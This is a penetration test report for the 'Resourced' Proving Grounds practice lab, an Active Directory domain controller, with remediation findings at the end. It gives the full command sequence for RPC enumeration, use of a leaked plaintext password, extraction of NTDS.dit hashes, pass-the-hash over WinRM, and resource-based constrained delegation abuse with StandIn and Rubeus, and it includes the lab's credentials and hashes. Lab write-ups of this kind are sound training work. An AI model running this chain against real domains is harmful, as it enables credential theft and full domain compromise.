# PGP Resourced - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-6

---

## 0. Lesson Learned

SMB paths containing spaces must be quoted or accessed after changing directories. Change into the directory before running `mget`.

The Kerberos ticket generated on the compromised Windows host could not be used directly because it existed only in the Windows LSASS Ticket Cache. Psexec could not access the ticket, so the ticket must be exported to Kali and converted to a compatible format.

---

## 1. Executive Summary

A penetration test was conducted against a Windows Active Directory domain controller within the RESOURCED.LOCAL domain. The objective of the assessment was to identify vulnerabilities that could allow an attacker to gain unauthorized access and escalate privileges within the environment.

During the assessment, several weaknesses were identified. Domain users were exposed through anonymous RPC enumeration, and sensitive information within a user description revealed valid credentials for the user v.ventz. These credentials provided authenticated access to the domain environment. Further investigation of accessible network shares revealed a Password Audit SMB share containing Active Directory backup files, including NTDS.dit and registry hive files.

By extracting password hashes from the NTDS database, additional credentials were obtained, allowing authentication as the user l.livingstone through WinRM. Privilege escalation was then achieved by abusing improper delegation permissions in the domain. Using StandIn, a new machine account was created and configured for resource-based constrained delegation (RBCD) against the domain controller. The tool Rubeus was subsequently used to request and inject a Kerberos ticket impersonating the Administrator account.

With the injected Kerberos ticket, administrative access to the domain controller was obtained using Impacket’s psexec, resulting in a SYSTEM-level shell on the target host. This confirmed full compromise of the domain controller and complete control over the RESOURCED.LOCAL domain.

---

## 2. Scope

- **Target:** 192.168.110.175
- **Environment:** Proving Grounds Practice Resourced
- **Testing Window:** 2026-3-5 to 2026-3-6
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP port scan was conducted to identify exposed services:

```
nmap -p- -sCV 192.168.110.175 -T4 -oA resourced_tcp
```

The scan identified the following relevant services:

- 88/tcp - Kerberos
- 445/tcp - SMB
- 389/tcp - LDAP
- 3268/tcp - Global Catalog
- 3389/tcp - RDP
- 5985/tcp - WinRM

These services indicate the host is an Active Directory Domain Controller.

---

## 5. Enumeration

Anonymous SMB login was successful but no shares were exposed:

```
smbclient -L //192.168.110.175 -N
```

LDAP enumeration revealed naming contexts but failed due to authentication requirements:

```
ldapsearch -x -H ldap://192.168.110.175 -s base namingContexts

ldapsearch -x -H ldap://192.168.110.175 -b "DC=resourced,DC=local" "(objectClass=person)"
```

RPC enumeration revealed domain users and groups:

```
rpcclient -U "" -N 192.168.110.175

enumdomusers

enumdomgroups
```

Revealing multiple domain accounts including:

```
Administrator
Guest
krbtgt
m.mason
k.keen
l.livingstone
v.ventz
```

---

## 6. Initial Access

Inspecting user information for `v.ventz` revealed a password in the user description:

```
queryuser 0x453
```

Discovered credentials:

```
v.ventz : HotelCalifornia194!
```

Credentials were validated with CrackMapExec:

```
crackmapexec smb 192.168.110.175 -u v.ventz -p 'HotelCalifornia194!'
```

AS-REP roastable accounts were not identified:

```
GetNPUsers.py resourced.local/ -no-pass -dc-ip 192.168.110.175 -usersfile usernames.txt
```

Kerberoastable accounts were not identified:

```
GetUserSPNs.py resourced.local/v.ventz:HotelCalifornia194! -dc-ip 192.168.110.175 -request
```

---

## 7. Post-Exploitation

Domain relationships were enumerated with BloodHound:

```
bloodhound-python -d resourced.local -u v.ventz -p 'HotelCalifornia194!' -ns 192.168.110.175 -c All --zip
```

The analysis revealed the following privilege escalation path:

```
L.Livingstone -> Generic All -> ResourceDC -> CoerceToTGT -> Domain Admins -> Administrator
```

This indicated a Resource Based Constrained Delegation with a potential for abuse.

Listing authenticated SMB shares revealed a Password Audit share:

```
smbclient -L //192.168.110.175 -U v.ventz --password=HotelCalifornia194!
```

The share was connected to and files were downloaded:

```
smbclient //192.168.110.175/'Password Audit' -U v.ventz --password=HotelCalifornia194!

recurse ON
prompt OFF

cd "Active Directory"
mget *

cd ../registry
mget *
```

The downloads contained sensitive files and directories:

```
ntds.dit
SYSTEM
SECURITY
```

The domain password hashes were extracted:

```
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

Revealing the hashes for user L.Livingstone:

```
L.Livingstone : 19a3a7550ce8c505c2d46b5e39d6f808
```

The hashes were validated:

```
crackmapexec winrm 192.168.110.175 -u l.livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
```

And a shell was obtained as L.Livingstone:

```
evil-winrm -i 192.168.110.175 -u l.livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
```

---

## 8. Privilege Escalation

Tools were uploaded via WinRM:

```
upload /opt/tools/PowerView.ps1

upload /opt/tools/StandIn_v13_Net45.exe

upload /opt/tools/Rubeus.exe
```

PowerView was loaded:

```
powershell -ep bypass

.\PowerView.ps1
```

Machine account was created with StandIn and generated password noted:

```
.\StandIn_v13_Net45.exe --computer AccountName --make
```

SID was obtained for the newly created machine:

```
Get-ADComputer -Filter * | Select-Object Name,SID
```

Resource-Based Constrained Delegation permissions were granted:

```
.\StandIn_v13_Net45.exe --computer RESOURCEDC --sid S-1-5-21-537427935-490066102-1511301751-4101
```

Rubeus was used to generate RC4 hash from created machine password:

```
.\Rubeus.exe hash /password:9PJU9KU0TncODGl
```

Rubeus s4u was used to impersonate administrator:

```
.\Rubeus.exe s4u /user:PCname /rc4:3180B8F37B013028CBB71A1296944B5C /impersonateuser:Administrator /msdsspn:cifs/RESOURCEDC.RESOURCED.LOCAL /nowrap /ptt
```

The Kerberos Ticket was exported and converted for use on Kali:

```
cat ticket.b64 | base64 -d > ticket.kirbi

impacket-ticketConverter ticket.kirbi ticket.ccache

export KRB5CCNAME=`pwd`/ticket.ccache
```

Verify ticket:

```
klist
```

A SYSTEM shell was obtained using the ticket:

```
psexec.py -k -no-pass RESOURCED.LOCAL/Administrator@RESOURCEDC.RESOURCED.LOCAL -dc-ip 192.168.110.175
```

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\L.Livingstone\Desktop\local.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Plaintext Password Stored in Active Directory Attribute

**Severity:** Critical

**Description:**
A domain user password was stored in plaintext within an Active Directory attribute (such as the description field), making it accessible to authenticated users.

**Impact:**
Attackers could retrieve the exposed credential and use it to authenticate as the affected user, potentially leading to privilege escalation or lateral movement.

**Recommendation:**
Prohibit storage of credentials in Active Directory attributes, implement auditing for sensitive attribute exposure, and perform credential rotation for affected accounts.

### **Finding:** Sensitive Active Directory Database Files Exposed via SMB Share

**Severity:** Critical

**Description:**
An SMB share exposed sensitive Active Directory database files, including NTDS.dit and registry hive files.

**Impact:**
Attackers could download the files and extract domain password hashes, potentially leading to full domain compromise.

**Recommendation:**
Restrict SMB share permissions to authorized administrators only, store backups in secured locations, and monitor file shares for exposure of sensitive Active Directory data.

### **Finding:** Excessive Delegation Permissions Allowing Resource-Based Constrained Delegation Abuse

**Severity:** Critical

**Description:**
Improper delegation permissions allowed attackers to configure Resource-Based Constrained Delegation (RBCD), enabling impersonation of privileged domain users.

**Impact:**
Attackers could impersonate domain administrators and gain full control of the domain.

**Recommendation:**
Review and restrict delegation permissions, limit machine account creation privileges, and regularly audit Active Directory objects for improper delegation configuration.

---

## 11. Appendix

StandIn Resource-Based Contrained Delegation Tool -
[https://github.com/FuzzySecurity/StandIn](https://github.com/FuzzySecurity/StandIn)

Extracting Password Hashes from `ntds.dit` File - 
[https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/](https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/)

RPC Enumeration Commands - 
[https://medium.com/@hello.cybeague/enumerating-rpc-services-using-rpcclient-on-metasploitable-2-3b167bbfdce5](https://medium.com/@hello.cybeague/enumerating-rpc-services-using-rpcclient-on-metasploitable-2-3b167bbfdce5)